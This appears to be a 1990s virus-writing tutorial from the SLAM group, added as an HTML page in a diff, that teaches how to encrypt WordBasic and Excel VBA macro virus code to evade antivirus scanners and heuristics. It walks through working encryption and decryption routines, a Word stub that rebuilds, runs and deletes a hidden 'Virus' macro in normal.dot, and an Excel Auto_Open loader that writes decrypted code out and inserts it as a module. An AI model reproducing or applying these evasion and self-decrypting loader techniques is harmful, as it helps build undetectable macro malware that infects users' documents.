@@ -1,0 +1,364 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - How to encrypt WordBasic and VBA code</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>How to encrypt wordbasic
+and vba code<BR>
+</FONT><FONT SIZE=+2>Nightmare Joker [SLAM]</FONT></FONT></B></P></CENTER>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+<UL>
+<PRE>                   
+<B>Let's start with Word:  
+~~~~~~~~~~~~~~~~~~~~~~  
+
+</B>The most macro virus scanner, like HMVS and F/WIN are practically able
+to find all word macro viruses, which don't hide the main code lines
+of a macro virus, like &quot;MacroCopy&quot; and &quot;FileSaveAs&quot;. The scanners search
+within the doc/dot files the strings for the macro commands. If you
+encrypt now the their most important scan strings then they can't find
+your virus. Probably only for a short time, but the many different
+ways to encrypt the code let's make your virus undetectable again within
+a short time, too. ;)
+After the SLAM #2 Issue, where the Killok virus would published ask me
+some people how to encrypt and of course decrypt the wordbasic and vba
+code. So, in principle it's very easy. For example, if you have the
+code line:
+
+      FileSaveAs .Format = 1
+
+then you only have to change every ascii sign with the next following.
+The first ascii sign &quot;F&quot; has the sign code &quot;70&quot;. We must now only add
+&quot;1&quot; to the ascii code of the character and translate it back to the
+ascii sign. If we make that with the whole Sentence then it looks
+like that:
+
+      GjmfTbwfBt /Gpsnbu &gt; 2
+
+Of course, you can add &quot;2&quot; or more numbers to the sign code, too.
+
+This in principle really *lame* encryption methode is good enough to
+confuse the heuristic analyse of the av scanners. If you want to use
+a more complex encryption then consider that WordBasic is REALLY slow!
+If your virus have about 5000 Bytes then it could take more than 15
+seconds to decrypt the code! That could be a little bit to conspicuous. ;)
+
+Look now to the following code. It demonstrate the simple way to
+encrypt your code within a wordbasic macro:
+
+              ToolsMacro .Name = &quot;OldCODE&quot;, .Show = 1, .Edit
+              EditSelectAll : a$ = Selection$()
+              DocClose 2
+              For a = 1 To Len(a$)
+              b$ = Mid$(a$, a, 1)
+              b = Asc(Mid$(a$, a, 1)) 
+              c = b + 1
+              If c &gt; 255 Then c = c - 256 
+              d$ = d$ + Chr$(c)
+              Next
+              ToolsMacro .Name = &quot;NewCODE&quot;, .Show = 1, .Edit
+              Insert d$
+
+The first three code lines open the &quot;OldCODE&quot; macro (normal.dot),
+
+==&gt; ToolsMacro .Name = &quot;OldCODE&quot;, .Show = 1, .Edit
+
+and select the whole macro code.
+
+==&gt; EditSelectAll
+
+Copy the selected code lines into the a$ variable
+
+==&gt; a$ = Selection$()
+
+and close it again.
+
+==&gt; DocClose 2
+
+The number &quot;2&quot; behind the DocClose command mean that we close the macro
+without saving it. 
+
+The following code lines encrypt now the code within the a$ variable.
+
+At first create a loop, which jumps back to this line until we have
+encrypted the last character of the a$ variable.
+
+==&gt; For a = 1 To Len(a$)
+
+Copy the ascii sign of the current position within the ax variable to
+the b$ variable. 
+
+==&gt; b$ = Mid$(a$, a, 1)
+
+Insert now the ascii code of the ascii sign within the bX variable into
+the integer b.
+
+==&gt; b = Asc(Mid$(a$, a, 1))
+
+Add 1 to the number of the integer b
+
+==&gt; c = b + 1
+
+If the integer c is bigger than 255 then subtract 256 of it.
+
+==&gt; If c &gt; 255 Then c = c - 256
+
+At last insert the *new* encrypted character into the d$ variable
+
+==&gt; d$ = d$ + Chr$(c)
+
+and jump back to the first line of the Loop, if that wasn't the last
+character of the code within the ax variable.
+
+==&gt; Next a
+
+After that the d$ variable contains the *new* encrypted virus code.
+Open now a new macro with the name &quot;NewCODE&quot; 
+
+==&gt; ToolsMacro .Name = &quot;NewCODE&quot;, .Show = 1, .Edit
+
+and insert the encrypted code lines.
+
+==&gt; Insert d$
+
+So, that's it. Now you see the encrypted code in the &quot;NewCODE&quot; macro.
+Do NOT close the &quot;NewCODE&quot; macro NOW. Paste and insert it immediately
+into your new virus/Arrays. If you would close it then our good old
+M$ Word would destroy the whole encrypted code, because it would try
+to mark all errors with a space sign. If you would translate that, then
+your decryption routine would decrypt the space characters too and you
+would get only some shit. ;)
+
+Let's look now on the encrypted code within the virus.
+In principle there are three ways to store the encrypted code:
+
+- Arrays
+- Document variable
+- Macro
+
+The last methode is probably the most difficult methode and is only
+useful if you want to make a real polymprphic macro virus. The second
+methode has only the advantage that you can reduce the main virus code
+extreme. The best and fastest methode is the first. Arrays are really
+fast and easy to decode. Look at the following example:
+
+              Dim Shared A$(8)
+
+              Sub MAIN            
+              A$(0) = &quot;û&Atilde;&Iacute;&raquo;&frac14;&AElig;&iquest;õ&Iuml;&Icirc;&Eacute;&sect;&raquo;&frac12;&Igrave;&Eacute;&Iacute;&quot;
+              A$(1) = &quot;&Agrave;~zóz &Atilde;&AElig;&iquest;&uml;&raquo;&Ccedil;&iquest;~ÇÉ&quot;
+              A$(2) = &quot; &Eacute;&Igrave;z&Aacute;zózãz&reg;&Eacute;zù&Eacute;&Iuml;&Egrave;&Icirc; &Atilde;&AElig;&iquest;&Iacute;ÇÉ&quot;
+              A$(3) = &quot;&pound;&Agrave;z &Atilde;&AElig;&iquest;&Iacute;~Ç &Atilde;&AElig;&iquest;&uml;&raquo;&Ccedil;&iquest;~Ç&Aacute;ÉÉzñòz||z&reg;&Acirc;&iquest;&Egrave;&quot;
+              A$(4) = &quot; &Atilde;&AElig;&iquest;&brvbar;&Atilde;&Iacute;&Icirc;z&Aacute;&quot; 
+              A$(5) = &quot;&Acirc;~zóz &Atilde;&AElig;&iquest;&uml;&raquo;&Ccedil;&iquest;~ÇÉ&quot;
+              A$(6) = &quot;&pound;&Agrave;z&Agrave;~zñòz&Acirc;~z&reg;&Acirc;&iquest;&Egrave;&quot;
+              A$(7) = &quot;&pound;&Agrave;z&iexcl;&iquest;&Icirc;û&Eacute;&frac12;&Iuml;&Ccedil;&iquest;&Egrave;&Icirc;&deg;&raquo;&Igrave;~Ç|&yen;&Atilde;&AElig;&AElig;&Eacute;&Aring;|Ézóz||z&reg;&Acirc;&iquest;&Egrave;&quot;
+              A$(8) = &quot; &Atilde;&AElig;&iquest;&shy;&raquo;&ETH;&iquest;õ&Iacute;zà &Eacute;&Igrave;&Ccedil;&raquo;&Icirc;zózã&quot;
+              ToolsMacro .Name = &quot;Virus&quot;, .Show = 1, .Edit
+              For i = 1 To 8
+                  For x = 1 To Len(A$(i))
+                      b = Asc(Mid$(A$(i), x, 1))
+                      c = b - 1
+                      If c &lt; 0 Then c = c + 255                      
+                      d$ = d$ + Chr$(c)
+                  Next x
+                  Insert d$
+                  InsertPara
+                  d$ = &quot;&quot;
+              Next i
+              DocClose 1
+              Virus
+              ToolsMacro .Name = &quot;Virus&quot;, .Show = 1, .Delete
+
+The first 12 lines are the Arrays and the code for it.
+At line 13 begins the main decryption routine. The virus opens
+there a new macro (normal.dot) with the name &quot;Virus&quot;.
+
+=&gt; ToolsMacro .Name = &quot;Virus&quot;, .Show = 1, .Edit
+
+Creates a loop (for the 8 Arrays)
+
+=&gt; For i = 1 To 8
+
+and an other loop to decrypt the current variable = A$(i) within the Array.
+
+=&gt; For x = 1 To Len(A$(i))
+
+Get the ascii code from the current ascii sign within the variable A$(i)
+
+=&gt; b = Asc(Mid$(A$(i), x, 1))
+
+Subtract now &quot;1&quot; from the ascii code 
+
+=&gt; c = b - 1
+
+If the integer is smaller than 0 then add &quot;255&quot; to it.
+
+=&gt; If c &lt; 0 Then c = c + 255
+
+Translate the ascii code back to the ascii sign and insert it into the
+d$ variable.
+
+=&gt; d$ = d$ + Chr$(c)
+
+Jump back to the start of the second loop, if the current ascii sign isn't
+the last of the whole current A$(i) variable.
+
+=&gt; Next x
+
+Insert the decrypted code into the new &quot;Virus&quot; macro.
+
+=&gt; Insert d$
+=&gt; InsertPara
+
+Delete the content of the d$ variable now
+
+=&gt; d$ = &quot;&quot;
+
+and jump back to the first loop to decrypt the next variable within the
+Array. 
+
+=&gt; Next i
+
+If we decrypted the whole A$(8) Array then close and save the &quot;Virus&quot; macro.
+
+=&gt; DocClose 1             
+
+That's all. Now you have your main virus within the &quot;Virus&quot; macro and
+could start it to infect a other file or to do something else. ;)
+
+=&gt; Virus
+
+Of course, at last should you delete the &quot;Virus&quot; macro again.
+
+=&gt; ToolsMacro .Name = &quot;Virus&quot;, .Show = 1, .Delete
+
+Isn't it easy? I think it is and it should be really no problem for
+everyone to use a encrypted code within his own word macro virus.
+
+                       
+<B>OK, and now on Excel:  
+~~~~~~~~~~~~~~~~~~~~~  
+
+</B>So, let's look now to a simple decryption methode for a excel vba module.
+
+              Dim Shared H$(7)
+              Sub Auto_Open()
+              H$(0) = &quot;&yen;&yen;&AElig;&otilde;&otilde;&ntilde;&icirc;&egrave;&aelig;&ugrave;&icirc;&ocirc;&oacute;&sup3;&Eacute;&icirc;&oslash;&otilde;&ntilde;&aelig;&thorn;&AElig;&ntilde;&ecirc;&divide;&ugrave;&oslash;&yen;&Acirc;&yen;&Euml;&aelig;&ntilde;&oslash;&ecirc;&quot;
+              H$(1) = &quot;&yen;&yen;&Oslash;&iacute;&ecirc;&ecirc;&ugrave;&oslash;&shy;&ugrave;&sup3;&Oacute;&aelig;&ograve;&ecirc;&reg;&sup3;&Oslash;&ecirc;&ntilde;&ecirc;&egrave;&ugrave;&quot;
+              H$(2) = &quot;&yen;&yen;&AElig;&egrave;&ugrave;&icirc;&ucirc;&ecirc;&Uuml;&icirc;&oacute;&eacute;&ocirc;&uuml;&sup3;&Oslash;&ecirc;&ntilde;&ecirc;&egrave;&ugrave;&ecirc;&eacute;&Oslash;&iacute;&ecirc;&ecirc;&ugrave;&oslash;&sup3;&Eacute;&ecirc;&ntilde;&ecirc;&ugrave;&ecirc;&quot;
+              H$(3) = &quot;&yen;&yen;&Oslash;&iacute;&ecirc;&ecirc;&ugrave;&oslash;&shy;&sect;&Eacute;&Ocirc;&Oacute;&sect;&reg;&sup3;&Oslash;&ecirc;&ntilde;&ecirc;&egrave;&ugrave;&quot;
+              H$(4) = &quot;&yen;&yen;&AElig;&egrave;&ugrave;&icirc;&ucirc;&ecirc;&Uuml;&icirc;&oacute;&eacute;&ocirc;&uuml;&sup3;&Oslash;&ecirc;&ntilde;&ecirc;&egrave;&ugrave;&ecirc;&eacute;&Oslash;&iacute;&ecirc;&ecirc;&ugrave;&oslash;&sup3;&Ucirc;&icirc;&oslash;&icirc;&ccedil;&ntilde;&ecirc;&yen;&Acirc;&yen;&Euml;&aelig;&ntilde;&oslash;&ecirc;&quot;
+              H$(5) = &quot;&yen;&yen;&AElig;&otilde;&otilde;&ntilde;&icirc;&egrave;&aelig;&ugrave;&icirc;&ocirc;&oacute;&sup3;&AElig;&egrave;&ugrave;&icirc;&ucirc;&ecirc;&Uuml;&ocirc;&divide;&eth;&ccedil;&ocirc;&ocirc;&eth;&sup3;&Oslash;&aelig;&ucirc;&ecirc;&quot;
+              H$(6) = &quot;&yen;&yen;&Uuml;&icirc;&oacute;&eacute;&ocirc;&uuml;&oslash;&shy;&eacute;&aelig;&ugrave;&copy;&reg;&sup3;&AElig;&egrave;&ugrave;&icirc;&ucirc;&aelig;&ugrave;&ecirc;&iquest;&yen;&Oslash;&iacute;&ecirc;&ecirc;&ugrave;&oslash;&shy;&sect;&times;&ecirc;&otilde;&ntilde;&icirc;&egrave;&aelig;&ugrave;&ecirc;&sect;&reg;&sup3;&Eacute;&ecirc;&ntilde;&ecirc;&ugrave;&ecirc;&quot;
+              H$(7) = &quot;&yen;&yen;&AElig;&otilde;&otilde;&ntilde;&icirc;&egrave;&aelig;&ugrave;&icirc;&ocirc;&oacute;&sup3;&Eacute;&icirc;&oslash;&otilde;&ntilde;&aelig;&thorn;&AElig;&ntilde;&ecirc;&divide;&ugrave;&oslash;&yen;&Acirc;&yen;&Ugrave;&divide;&uacute;&ecirc;&quot;
+              Open &quot;\H.txt&quot; For Output As #1
+              For X = 0 To 7
+                 j$ = encrypt(H$(X))
+                 Print #1, j$
+              Next X
+              Close #1
+              Modules.Add
+              ActiveSheet.InsertFile Filename:=&quot;\H.txt&quot;
+              End Sub
+
+              Function encrypt(k$)
+              For i = 1 To Len(k$)
+                  b = Asc(Mid$(k$, i, 1))
+                  c = b - 1
+                  d$ = d$ + Chr$(c)                  
+              Next i
+              decrypt = d$
+              End Function
+
+The first 10 lines are again the Arrays and the code for it.
+
+Note: The encrypted code within the Arrays is only a example!
+I say that, because there are sure again some people, who think
+they must use this encrypted example code in their own virus. ;)
+
+At line 11 begins the main decryption routine. The virus opens
+there a normal ascii file (H.txt).
+
+=&gt; Open &quot;\H.txt&quot; For Output As #1
+
+Generates a loop. (0 to number of Arrays)
+
+=&gt; For X = 0 To 7
+
+And decrypt one of the variables within the Array.
+
+=&gt; j$ = decrypt(H$(X))
+
+Insert the decrypted code line into the ascii file H.txt.
+
+=&gt; Print #1, j$
+
+If that wasn't the last variable, then decrypt the next. :)
+
+=&gt; Next X
+
+So, if we have decrypted the whole code then close the ascii file
+
+=&gt; Close #1
+
+and insert a new module into the main virus excel file.
+
+=&gt; Modules.Add
+
+Insert now the decrypted code into the new module. 
+
+=&gt; ActiveSheet.InsertFile Filename:=&quot;\H.txt&quot;
+
+Well, now you must only start the new module and delete it after that
+again. That's all you have to do for a excel anti-heuristic virus. ;)
+
+Here still the description of the main decryption routine:
+
+=&gt;Function encrypt(k$)
+
+Generate a loop. (lenght of the loop = lenght of the string k$)
+
+=&gt; For i = 1 To Len(k$)
+
+Get the ascii code from the current ascii sign within the variable k$
+
+=&gt; b = Asc(Mid$(k$, i, 1))
+
+Subtract now &quot;1&quot; from the ascii code 
+
+=&gt; c = b - 1
+
+Translate the ascii code back to the ascii sign and insert it into the
+d$ variable.
+
+=&gt; d$ = d$ + Chr$(c)
+
+Jump back to the begin of the loop.
+
+=&gt; Next i
+
+If we have decrypted the whole code then insert it into the d$ variable.
+
+=&gt; decrypt = d$
+=&gt; End Function
+
+Well, that's it. I hope everyone understand this description. If someone
+want to see a example virus then look at the Anti-Heuristic Excel Virus DON.
+
+bye
+
+-Nightmare Joker-</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+</BODY>
+</HTML>
